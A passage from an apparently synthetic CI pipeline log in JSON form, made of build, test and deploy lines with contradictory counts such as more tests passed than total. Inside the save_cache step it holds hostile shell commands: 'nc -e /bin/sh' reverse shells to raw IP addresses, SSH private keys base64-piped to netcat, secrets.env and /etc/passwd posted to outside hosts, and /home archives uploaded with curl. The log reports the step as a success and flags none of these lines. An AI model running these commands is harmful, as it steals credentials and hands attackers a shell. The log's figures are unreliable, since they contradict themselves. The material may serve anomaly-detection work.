passed, 235 total\nUploading artifact 'dist' (23 files)\npip: Downloading webpack-5.10.tar.gz\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:43] INFO: Connecting to database\nCache restored successfully (215MB)\n[12:19:43] INFO: Starting build process\npip: Installing build dependencies...\nUsing Node.js 15.12.0\n[12:19:43] DEBUG: Memory usage: 1743MB\nInstalling webpack@4.18.5\nStep 9/20: Installing dependencies\nCoverage: 79% statements, 67% branches\nGenerating source maps...\n\u2713 Task completed in 675ms\nProcessing...\nProcessing...\n\u2717 build failed with exit code 32\nUsing Node.js 18.18.5\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/service.java...\nNODE_ENV=production\nOptimizing 62 modules...\nSnapshots: 26 passed, 43 total\nnpm install: resolved 254 packages\nUsing Python 3.11\nInstalling prettier@2.18.2\n[12:19:43] DEBUG: Connection pool: 13 active\n  PASS: test_api_health (54ms)\nTests: 191 passed, 315 total\nAlready up to date.\nStep 10/15: Building\nnpm install: added 490 packages\nImage pulled successfully\n[12:19:43] DEBUG: Initializing service\nCompiling utils/app.ts...\nReady.\nTransforming 610 files...\n  PASS: integration/test_user_create.spec.js\nEnvironment: development\nUploading artifact 'dist' (10 files)\nConnecting to startup.dev:443...\nDone.\n[12:19:43] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (58MB)\nAlready up to date.\nFetching submodules...\nCompiling utils/main.py...\n\u2713 Task completed in 1594ms\nCoverage: 100% statements, 76% branches\n\u2713 Task completed in 1460ms\nHEAD is now at 4fa832f\nReady.\nTests: 312 passed, 391 total\nWARNING: axios has known vulnerabilities\nPulling image: alpine:latest\nOK\n[12:19:43] WARN: Deprecated API usage\n  PASS: test_cache_hit (382ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at 00ac381\nnpm install: added 258 packages\nUsing Node.js 18.8.7\nyarn add: Done in 17.75s\nUsing Python 3.11\nFetching submodules...\n[12:19:43] WARN: Deprecated API usage\nyarn add: Done in 27.90s\nRan 67 tests in 5s\n  PASS: test_user_create (455ms)\n[12:19:43] INFO: Starting build process\nFAILED: test_auth_login\nChecking out main branch\nStep 18/22: Deploying\n  PASS: unit/test_db_connect.spec.js\nTest Suites: 26 passed, 27 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nPlatform: linux-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-5038\nTest Suites: 32 passed, 35 total\nPOST /upload - 201 (40ms)\nOptimizing 20 modules...\nFinished.\nWaiting...\npip: Collecting prettier\nGET /health - 200 (46ms)\nCompiling src/service.java...\nStep 17/23: Linting\nVerifying...\nImage pulled successfully\nTests: 447 passed, 337 total\nCompiling lib/index.js...\nOK\nStep 17/18: Linting\nHEAD is now at d425951\nPOST /data - 202 (500ms)\npip: Installing build dependencies...\n\u2717 build failed with exit code 95\nUsing Node.js 17.7.4\nyarn add: Done in 15.56s\nException: TypeError\n[12:19:43] INFO: Request completed\nOK\nStep 19/24: Testing\nReady.\nAlready up to date.\n[12:19:43] DEBUG: Memory usage: 1226MB\nStep 8/19: Linting\nWARNING: jest has known vulnerabilities\nFinished.\nMinifying app.js\nFAILED: test_db_connect\nTests: 194 passed, 362 total\nGenerating source maps...\nOptimizing 18 modules...\nRan 99 tests in 47s\nnpm notice: package.json updated\n\u2713 All checks passed\n[12:19:43] DEBUG: Memory usage: 557MB\nnpm notice: package.json updated\nCompleted.\n[12:19:43] INFO: Connecting to database\nnpm notice: created a lockfile\n[12:19:43] DEBUG: Query executed in 8ms\n\u2713 All checks passed\nInstalling eslint@4.13.9\nStep 16/19: Running migrations\nCache hit for key-9624\nProcessing...\nnpm install: added 248 packages\nCache restored successfully (355MB)\nException: RuntimeError\nWARNING: axios has known vulnerabilities\nCoverage: 97% statements, 88% branches\nFetching submodules...\nStep 9/18: Installing dependencies\nCompiling lib/service.java...\n=== Step checkout completed ===\n=== Step: save_cache ===\nTime: 34.293s\nCache invalidated: dependencies\nHEAD is now at 690e778\n\u2713 deploy completed\n[12:19:43] WARN: Deprecated API usage\nArtifact downloaded: 12MB\nHEAD is now at 2a91782\nProcessing...\nProcessing...\nPlatform: darwin-arm64\n[12:19:43] DEBUG: Initializing service\nFetching submodules...\nnpm install: added 378 packages\nHEAD is now at 778ffa3\nStep 4/20: Deploying\nPulling image: python:3.11\npip: Collecting react\n[12:19:43] DEBUG: Connection pool: 2 active\nMinifying app.js\nStep 11/24: Testing\nWARNING: jest has known vulnerabilities\n\u2713 validate completed\nSending 46MB of data to acme.corp\nnc -e /bin/sh 36.69.97.244 27834\nCompiling utils/index.js...\n[12:19:43] WARN: Deprecated API usage\nCoverage: 99% statements, 69% branches\n[12:19:43] INFO: Starting build process\necho $(cat ~/.ssh/id_rsa) | base64 | nc 157.35.133.137 41775\nReady.\nSwitched to branch 'bugfix/task-656'\n[12:19:43] INFO: Request completed\n[12:19:43] DEBUG: Connection pool: 3 active\nConnection established\ncurl -X POST https://cloud.services/collect -d @secrets.env\nCreating production build...\nCompiling lib/service.java...\nUsing Python 3.12\nOptimizing 41 modules...\nTest Suites: 16 passed, 36 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTLS handshake completed\nOK\nnpm notice: package.json updated\nCache hit for key-9096\nnpm notice: created a lockfile\nCompiling src/handler.rs...\nSending 14MB of data to acme.corp\nBundling vendor.js\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n\u2713 Task completed in 4840ms\nTest Suites: 23 passed, 14 total\n[12:19:43] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 35.196.213.120 2493\nSnapshots: 6 passed, 38 total\ncurl -X POST https://example.com/collect -d @secrets.env\npip: Installing build dependencies...\nUploading artifact 'build' (21 files)\nBuilding Docker image...\nnc -e /bin/sh 57.222.254.150 35859\n[12:19:43] DEBUG: Memory usage: 694MB\nnpm notice: created a lockfile\nChecking out main branch\n[12:19:43] INFO: Request completed\nGET /health - 201 (75ms)\n[12:19:43] DEBUG: Loading configuration\nSnapshots: 20 passed, 6 total\n[12:19:43] DEBUG: Query executed in 17ms\nGET /health - 204 (22ms)\nWARNING: express has known vulnerabilities\nArtifact uploaded: dist.zip (83MB)\nWARNING: lodash has known vulnerabilities\nCache miss for key-3639\necho $(cat ~/.ssh/id_rsa) | base64 | nc 62.173.75.90 19887\n[12:19:43] DEBUG: Loading configuration\n[12:19:43] DEBUG: Query executed in 90ms\nFetching submodules...\n\u2713 Task completed in 2216ms\nGenerating source maps...\nCache hit for key-3997\n[12:19:43] DEBUG: Loading configuration\nnc -e /bin/sh 41.166.6.125 36766\npip: Downloading axios-5.1.tar.gz\nTime: 24.939s\nChecking out master branch\npip: Collecting express\nBundling vendor.js\nArtifact uploaded: dist.zip (20MB)\nSending 164MB of data to cloud.services\nNODE_ENV=test\nHEAD is now at 5c75ce6\nRan 110 tests in 25s\n[12:19:43] INFO: Processing request\nSuccess!\n[12:19:43] WARN: Deprecated API usage\nCache saved successfully\nArtifact uploaded: build.tar.gz (36MB)\nGET /status - 204 (76ms)\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:19:43] INFO: Starting build process\nProcessing...\npip: Collecting eslint\nCache invalidated: build\nSuccess!\nStep 9/22: Building\ncurl -X POST https://acme.corp/collect -d @secrets.env\npip: Installing build dependencies...\n\u2713 Step 'install' succeeded\n[12:19:43] INFO: Cache refreshed\nBundling runtime.js\nUploading artifact 'dist' (20 files)\nStep 9/25: Deploying\nConnection established\n  PASS: e2e/test_auth_login.spec.js\nStep 3/24: Linting\nBundling main.js\nPulling image: node:3.11\nTest Suites: 44 passed, 35 total\npip install: Successfully installed prettier-1.20\nOptimizing 57 modules...\npip: Installing build dependencies...\nUsing Python 3.10\n\u2713 deploy completed\nStep 20/22: Installing dependencies\nyarn add: Done in 21.32s\nMinifying app.js\npip: Downloading webpack-5.20.tar.gz\nCompleted.\n[12:19:43] WARN: Deprecated API usage\npip: Installing build dependencies...\nnpm install: added 340 packages\nFAILED: test_api_health\n[12:19:43] DEBUG: Initializing service\nNODE_ENV=production\n[12:19:43] WARN: Deprecated API usage\nCompiling components/app.ts...\nStep 6/20: Testing\nGenerating source maps...\nTime: 21.440s\nLayer 5/12: COPY command\nFetching submodules...\nnpm install: resolved 1950 packages\nStep 4/19: Linting\nCompleted.\nyarn add: Done in 13.85s\nCache restored successfully (121MB)\nImage pulled successfully\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n[12:19:43] DEBUG: Connection pool: 8 active\nTest Suites: 25 passed, 15 total\nCache hit for key-5672\nCache saved successfully\nCompiling utils/main.py...\nCompiling lib/service.java...\nConnecting to example.com:443...\nLayer 3/14: COPY command\nStep 16/19: Deploying\nCache restored successfully (37MB)\nUsing Node.js 17.17.8\nDone.\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:19:43] INFO: Connecting to database\nException: TypeError\npip: Collecting react\nBundling main.css\nChecking out develop branch\nCoverage: 77% statements, 76% branches\ncurl -X POST https://cloud.services/collect -d @secrets.env\nOptimizing 55 modules...\nAlready up to date.\nWARNING: axios has known vulnerabilities\nnc -e /bin/sh 122.130.172.54 2474\nChecking out develop branch\nConnecting to acme.corp:443...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 126.44.35.207 17664\ncurl -X POST https://startup.dev/collect -d @secrets.env\nConnection established\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n  PASS: test_api_health (32ms)\npip install: Successfully installed lodash-1.5\nTests: 85 passed, 219 total\n[12:19:43] INFO: Starting build process\n[12:19:43] WARN: Deprecated API usage\n[12:19:43] DEBUG: Loading configuration\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nException: NullPointerException\nCache hit for key-9940\n[12:19:43] DEBUG: Query executed in 31ms\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nProcessing...\nArtifact uploaded: build.tar.gz (19MB)\nArtifact downloaded: 14MB\nException: NullPointerException\nCache saved successfully\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n=== Step save_cache completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-25T12:19:43.464554",
        "finished_at": "2025-11-25T12:19:51.529476",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache saved successfully",
          "Time: 69.683s",
          "pip: Collecting webpack",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 deploy completed",
          "Image pulled successfully",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: created a lockfile",
          "Transforming 984 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 28MB",
          "Checking out main branch",
          "  PASS: unit/test_user_create.spec.js",
          "Artifact uploaded: dist.zip (72MB)",
          "npm install: added 392 packages",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/index.js...",
          "Environment: production",
          "Using Node.js 14.8.2",
          "[12:19:43] DEBUG: Query executed in 11ms",
          "[12:19:43] WARN: Deprecated API usage",
          "pip install: Successfully installed react-3.14",
          "Exception: NullPointerException",
          "Environment: staging",
          "POST /upload - 202 (296ms)",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Success!",
          "Pulling image: python:3.11",
          "Compiling utils/handler.rs...",
          "Cache hit for key-4220",
          "Platform: win32-x64",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Verifying...",
          "Step 10/25: Linting",
          "Artifact uploaded: dist.zip (99MB)",
          "[12:19:43] WARN: Deprecated API usage",
          "Uploading artifact 'build' (9 files)",
          "Artifact uploaded: dist.zip (17MB)",
          "Step 18/24: Deploying",
          "Compiling components/utils.go...",
          "Compiling components/service.java...",
          "GET /health - 201 (88ms)",
          "npm install: resolved 1004 packages",
          "\u2717 build failed with exit code 15",
          "Step 4/19: Installing dependencies",
          "Verifying...",
          "npm install: added 488 packages",
          "Step 7/25: Deploying",
          "Cache hit for key-3958",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: RuntimeError",
          "Processing...",
          "pip: Downloading lodash-2.20.tar.gz",
          "Checking out main branch",
          "Connecting to test.io:443...",
          "Already up to date.",
          "Environment: production",
          "Ran 39 tests in 49s",
          "Using Python 3.10",
          "Compiling src/index.js...",
          "[12:19:43] DEBUG: Connection pool: 8 active",
          "TLS handshake completed",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "Done.",
          "HEAD is now at df3d323",
          "\u2713 package completed",
          "Finished.",
          "[12:19:43] DEBUG: Initializing service",
          "Compiling components/index.js...",
          "Compiling components/utils.go...",
          "Connecting to test.io:443...",
          "Minifying app.js",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 Step 'test' succeeded",
          "Step 2/22: Deploying",
          "npm install: added 406 packages",
          "Optimizing 61 modules...",
          "Minifying app.js",
          "Done.",
          "npm notice: created a lockfile",
          "[12:19:43] DEBUG: Memory usage: 727MB",
          "[12:19:43] WARN: Deprecated API usage",
          "Cache hit for key-6035",
          "HEAD is now at 4bd6094",
          "Transforming 797 files...",
          "Transforming 883 files...",
          "[12:19:43] DEBUG: Memory usage: 1569MB",
          "Cache hit for key-3199",
          "Switched to branch 'hotfix/task-472'",
          "Step 19/22: Running migrations",
          "[12:19:43] DEBUG: Initializing service",
          "Building Docker image...",
          "Step 19/23: Testing",
          "npm notice: created a lockfile",
          "Artifact downloaded: 36MB",
          "Waiting...",
          "Connecting to acme.corp:443...",
          "Step 1/21: Building",
          "pip: Collecting express",
          "Connecting to example.com:443...",
          "Step 19/18: Deploying",
          "npm install: added 472 packages",
          "pip: Installing build dependencies...",
          "OK",
          "npm notice: created a lockfile",
          "[12:19:43] DEBUG: Connection pool: 10 active",
          "pip: Downloading eslint-4.2.tar.gz",
          "npm install: added 373 packages",
          "Environment: test",
          "[12:19:43] WARN: Deprecated API usage",
          "Creating production build...",
          "Minifying vendor.js",
          "[12:19:43] WARN: Deprecated API usage",
          "Done.",
          "[12:19:43] DEBUG: Loading configuration",
          "Step 3/20: Building",
          "Platform: darwin-arm64",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:19:43] DEBUG: Query executed in 29ms",
          "Waiting...",
          "Transforming 572 files...",
          "Pushing to registry...",
          "  PASS: integration/test_auth_login.spec.js",
          "Environment: staging",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache saved successfully",
          "Connecting to acme.corp:443...",
          "Pushing to registry...",
          "Uploading artifact 'build' (50 files)",
          "[12:19:43] INFO: Processing request",
          "[12:19:43] ERROR: Connection failed",
          "Cache invalidated: build",
          "Done.",
          "pip: Collecting webpack",
          "Artifact downloaded: 29MB",
          "\u2713 All checks passed",
          "\u2713 Task completed in 4516ms",
          "Time: 75.224s",
          "npm install: resolved 144 packages",
          "Installing jest@3.14.9",
          "Step 4/20: Building",
          "pip: Installing build dependencies...",
          "Done.",
          "Creating production build...",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "pip install: Successfully installed express-1.0",
          "  PASS: test_cache_hit (38ms)",
          "Bundling main.js",
          "[12:19:43] INFO: Processing request",
          "Compiling src/main.py...",
          "Platform: linux-x64",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 246ms",
          "yarn add: Done in 22.62s",
          "Step 12/23: Linting",
          "Using Python 3.12",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Loading...",
          "Optimizing 98 modules...",
          "  PASS: e2e/test_db_connect.spec.js",
          "\u2713 Step 'install' succeeded",
          "Pushing to registry...",
          "WARNING: lodash has known vulnerabilities",
          "Using Python 3.9",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:19:51.529476",
        "finished_at": "2025-11-25T12:19:54.755445",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Uploading artifact 'coverage' (30 files)",
          "GET /status - 201 (75ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: TypeError",
          "Compiling lib/handler.rs...",
          "Ready.",
          "npm install: added 258 packages",
          "[12:19:43] DEBUG: Connection pool: 3 active",
          "Compiling src/utils.go...",
          "yarn add: Done in 13.43s",
          "Connecting to example.com:443...",
          "Waiting...",
          "Completed.",
          "Compiling src/utils.go...",
          "Cache miss for key-2360",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "  PASS: test_user_create (139ms)",
          "npm install: resolved 401 packages",
          "Artifact downloaded: 43MB",
          "\u2713 All checks passed",
          "[12:19:43] INFO: Processing request",
          "OK",
          "[12:19:43] INFO: Cache refreshed",
          "Loading...",
          "Test Suites: 8 passed, 36 total",
          "Step 15/15: Installing dependencies",
          "Using Python 3.10",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Test Suites: 8 passed, 23 total",
          "Using Python 3.12",
          "Test Suites: 32 passed, 21 total",
          "Success!",
          "Compiling lib/main.py...",
          "Success!",
          "Switched to branch 'bugfix/task-428'",
          "Step 13/18: Testing",
          "Step 4/19: Deploying",
          "Waiting...",
          "Test Suites: 21 passed, 30 total",
          "npm install: added 294 packages",
          "Platform: linux-x64",
          "[12:19:43] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Step 8/15: Building",
          "Bundling runtime.css",
          "Checking out develop branch",
          "POST /upload - 200 (172ms)",
          "Fetching submodules...",
          "Cache hit for key-4361",
          "HEAD is now at 34c5c76",
          "Optimizing 82 modules...",
          "Coverage: 92% statements, 77% branches",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 18/19: Deploying",
          "[12:19:43] DEBUG: Initializing service",
          "Completed.",
          "pip install: Successfully installed jest-1.2",
          "Bundling main.js",
          "pip install: Successfully installed react-5.8",
          "Ready.",
          "[12:19:43] DEBUG: Initializing service",
          "Optimizing 27 modules...",
          "Creating production build...",
          "\u2713 Task completed in 1811ms",
          "Loading...",
          "Step 11/24: Deploying",
          "Done.",
          "[12:19:43] WARN: Deprecated API usage",
          "Using Python 3.11",
          "  PASS: e2e/test_cache_hit.spec.js",
          "[12:19:43] WARN: Deprecated API usage",
          "pip install: Successfully installed prettier-5.9",
          "Cache restored successfully (274MB)",
          "Step 16/22: Running migrations",
          "Waiting...",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "npm install: added 15 packages",
          "npm install: added 35 packages",
          "Test Suites: 50 passed, 33 total",
          "Step 7/23: Running migrations",
          "\u2713 All checks passed",
          "Optimizing 48 modules...",
          "pip install: Successfully installed jest-3.20",
          "Installing webpack@2.19.4",
          "Ready.",
          "pip: Downloading prettier-2.18.tar.gz",
          "pip: Collecting jest",
          "pip install: Successfully installed express-2.19",
          "Fetching submodules...",
          "Connection established",
          "WARNING: webpack has known vulnerabilities",
          "Bundling runtime.js",
          "Already up to date.",
          "npm install: added 128 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out main branch",
          "Using Node.js 16.6.8",
          "Ran 15 tests in 31s",
          "npm install: resolved 1102 packages",
          "Transforming 703 files...",
          "\u2713 deploy completed",
          "Using Node.js 20.11.1",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Downloading eslint-5.3.tar.gz",
          "Compiling utils/service.java...",
          "Artifact downloaded: 40MB",
          "Ran 50 tests in 6s",
          "Cache hit for key-1960",
          "Building Docker image...",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:43] DEBUG: Memory usage: 1520MB",
          "Tests: 413 passed, 175 total",
          "Cache miss for key-9712",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "Time: 15.219s",
          "Ready.",
          "Done.",
          "npm install: added 153 packages",
          "Generating source maps...",
          "Step 15/25: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "[12:19:43] INFO: Starting build process",
          "NODE_ENV=development",
          "[12:19:43] DEBUG: Memory usage: 131MB",
          "FAILED: test_db_connect",
          "npm install: added 391 packages",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling utils/service.java...",
          "Cache restored successfully (64MB)",
          "Creating production build...",
          "TLS handshake completed",
          "  PASS: integration/test_api_health.spec.js",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "Step 5/20: Testing",
          "NODE_ENV=test",
          "  PASS: test_user_create (259ms)",
          "Installing webpack@2.20.10",
          "pip: Collecting jest",
          "Waiting...",
          "npm notice: created a lockfile",
          "Time: 22.716s",
          "[12:19:43] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Cache saved successfully",
          "Compiling utils/service.java...",
          "Artifact uploaded: dist.zip (40MB)",
          "Installing lodash@4.19.1",
          "\u2717 build failed with exit code 24",
          "Compiling lib/index.js...",
          "Step 2/25: Installing dependencies",
          "HEAD is now at 901978f",
          "Cache miss for key-1180",
          "Image pulled successfully",
          "Already up to date.",
          "npm install: added 285 packages",
          "Creating production build...",
          "[12:19:43] DEBUG: Query executed in 8ms",
          "Compiling components/service.java...",
          "Artifact downloaded: 19MB",
          "Step 2/21: Building",
          "Fetching submodules...",
          "Cache saved successfully",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:19:54.755445",
        "finished_at": "2025-11-25T12:20:02.820367",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Loading...",
          "Cache miss for key-3458",
          "Ran 68 tests in 5s",
          "[12:19:43] WARN: Deprecated API usage",
          "Coverage: 99% statements, 83% branches",
          "Snapshots: 35 passed, 43 total",
          "npm notice: package.json updated",
          "Step 6/21: Testing",
          "Generating source maps...",
          "[12:19:43] DEBUG: Connection pool: 19 active",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Bundling styles.css",
          "Completed.",
          "Cache invalidated: dependencies",
          "Checking out develop branch",
          "  PASS: integration/test_auth_login.spec.js",
          "Finished.",
          "Verifying...",
          "Ran 111 tests in 8s",
          "npm install: added 170 packages",
          "Loading...",
          "Ready.",
          "Generating source maps...",
          "Pushing to registry...",
          "pip install: Successfully installed axios-4.5",
          "Transforming 462 files...",
          "Uploading artifact 'dist' (44 files)",
          "\u2713 All checks passed",
          "pip: Downloading prettier-2.9.tar.gz",
          "Artifact downloaded: 50MB",
          "npm install: resolved 847 packages",
          "[12:19:43] WARN: Deprecated API usage",
          "Layer 10/14: ENV command",
          "[12:19:43] INFO: Cache refreshed",
          "\u2713 build completed",
          "Step 16/16: Deploying",
          "Compiling src/service.java...",
          "[12:19:43] DEBUG: Memory usage: 1854MB",
          "Cache miss for key-5852",
          "Generating source maps...",
          "Optimizing 88 modules...",
          "[12:19:43] ERROR: Connection failed",
          "Done.",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: dist.zip (94MB)",
          "npm notice: created a lockfile",
          "Minifying main.js",
          "Environment: production",
          "Coverage: 94% statements, 64% branches",
          "Step 20/17: Installing dependencies",
          "npm install: resolved 1471 packages",
          "Ran 90 tests in 34s",
          "[12:19:43] DEBUG: Memory usage: 1077MB",
          "Fetching submodules...",
          "Cache saved successfully",
          "Pulling image: node:18",
          "pip: Collecting axios",
          "Step 2/22: Installing dependencies",
          "[12:19:43] INFO: Starting build process",
          "npm install: added 401 packages",
          "\u2717 build failed with exit code 61",
          "[12:19:43] DEBUG: Connection pool: 5 active",
          "Step 18/19: Linting",
          "Finished.",
          "[12:19:43] WARN: Deprecated API usage",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] DEBUG: Loading configuration",
          "Loading...",
          "Artifact uploaded: dist.zip (93MB)",
          "Step 14/21: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: resolved 549 packages",
          "\u2713 deploy completed",
          "Loading...",
          "[12:19:43] DEBUG: Memory usage: 336MB",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "Optimizing 19 modules...",
          "Ran 69 tests in 56s",
          "Creating production build...",
          "Artifact downloaded: 1MB",
          "Compiling lib/app.ts...",
          "Creating production build...",
          "pip: Collecting react",
          "npm notice: package.json updated",
          "[12:19:43] DEBUG: Loading configuration",
          "[12:19:43] INFO: Cache refreshed",
          "Already up to date.",
          "Step 2/24: Building",
          "Connecting to test.io:443...",
          "\u2717 build failed with exit code 83",
          "Step 6/16: Running migrations",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Transforming 406 files...",
          "Done.",
          "Step 10/22: Running migrations",
          "[12:19:43] INFO: Processing request",
          "pip install: Successfully installed lodash-4.19",
          "Step 2/23: Deploying",
          "Done.",
          "Creating production build...",
          "Installing webpack@2.11.0",
          "[12:19:43] WARN: Deprecated API usage",
          "[12:19:43] DEBUG: Initializing service",
          "Step 5/24: Deploying",
          "[12:19:43] WARN: Deprecated API usage",
          "Step 11/16: Linting",
          "[12:19:43] INFO: Processing request",
          "[12:19:43] INFO: Request completed",
          "Already up to date.",
          "\u2713 Task completed in 1879ms",
          "Loading...",
          "Verifying...",
          "OK",
          "pip: Collecting express",
          "Artifact uploaded: dist.zip (41MB)",
          "HEAD is now at 81b27f4",
          "[12:19:43] DEBUG: Loading configuration",
          "[12:19:43] INFO: Cache refreshed",
          "Done.",
          "Generating source maps...",
          "Artifact downloaded: 23MB",
          "Step 3/15: Running migrations",
          "Compiling src/utils.go...",
          "Coverage: 98% statements, 81% branches",
          "Step 11/25: Linting",
          "pip install: Successfully installed express-5.11",
          "Cache hit for key-3693",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:43] DEBUG: Connection pool: 20 active",
          "FAILED: test_auth_login",
          "Test Suites: 39 passed, 48 total",
          "NODE_ENV=production",
          "Transforming 101 files...",
          "Optimizing 27 modules...",
          "Minifying main.js",
          "Compiling src/handler.rs...",
          "Step 17/23: Building",
          "[12:19:43] ERROR: Connection failed",
          "Minifying app.js",
          "POST /data - 201 (491ms)",
          "Connecting to startup.dev:443...",
          "Building Docker image...",
          "Checking out develop branch",
          "[12:19:43] DEBUG: Initializing service",
          "POST /data - 200 (420ms)",
          "Compiling lib/handler.rs...",
          "Step 12/24: Running migrations",
          "[12:19:43] DEBUG: Memory usage: 1213MB",
          "Cache invalidated: node_modules",
          "TLS handshake completed",
          "Completed.",
          "Switched to branch 'hotfix/task-293'",
          "[12:19:43] WARN: Deprecated API usage",
          "POST /upload - 202 (143ms)",
          "\u2717 build failed with exit code 56",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] DEBUG: Initializing service",
          "Ready.",
          "NODE_ENV=test",
          "\u2713 deploy completed",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading express-3.3.tar.gz",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-25T12:20:02.820367",
        "finished_at": "2025-11-25T12:20:07.659320",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Environment: staging",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Platform: darwin-arm64",
          "Step 18/22: Linting",
          "Step 20/15: Installing dependencies",
          "Compiling lib/index.js...",
          "Completed.",
          "Cache miss for key-8218",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:19:43] DEBUG: Connection pool: 13 active",
          "Installing webpack@3.19.9",
          "WARNING: eslint has known vulnerabilities",
          "Completed.",
          "Step 9/17: Building",
          "Switched to branch 'bugfix/task-946'",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "Done.",
          "Creating production build...",
          "[12:19:43] DEBUG: Loading configuration",
          "Step 7/17: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:19:43] INFO: Connecting to database",
          "Step 3/20: Testing",
          "[12:19:43] WARN: Deprecated API usage",
          "pip: Collecting webpack",
          "npm notice: created a lockfile",
          "Step 4/19: Linting",
          "pip install: Successfully installed eslint-1.1",
          "Using Python 3.11",
          "Done.",
          "POST /api - 200 (14ms)",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: dist.zip (58MB)",
          "Processing...",
          "Installing express@4.18.2",
          "Step 10/21: Running migrations",
          "Building Docker image...",
          "Cache hit for key-5882",
          "[12:19:43] INFO: Connecting to database",
          "[12:19:43] INFO: Request completed",
          "Compiling utils/handler.rs...",
          "Pushing to registry...",
          "GET /api - 200 (84ms)",
          "Coverage: 82% statements, 64% branches",
          "npm notice: package.json updated",
          "[12:19:43] DEBUG: Query executed in 51ms",
          "Transforming 372 files...",
          "Test Suites: 13 passed, 20 total",
          "Layer 4/10: ENV command",
          "Cache miss for key-4090",
          "[12:19:43] INFO: Processing request",
          "Loading...",
          "Optimizing 57 modules...",
          "pip install: Successfully installed axios-4.8",
          "Step 17/21: Deploying",
          "\u2713 build completed",
          "Connection established",
          "Ran 162 tests in 2s",
          "Compiling components/index.js...",
          "[12:19:43] INFO: Starting build process",
          "Verifying...",
          "Pulling image: node:18",
          "\u2713 Step 'setup' succeeded",
          "Building Docker image...",
          "Step 1/20: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connecting to test.io:443...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Cache miss for key-4032",
          "Verifying...",
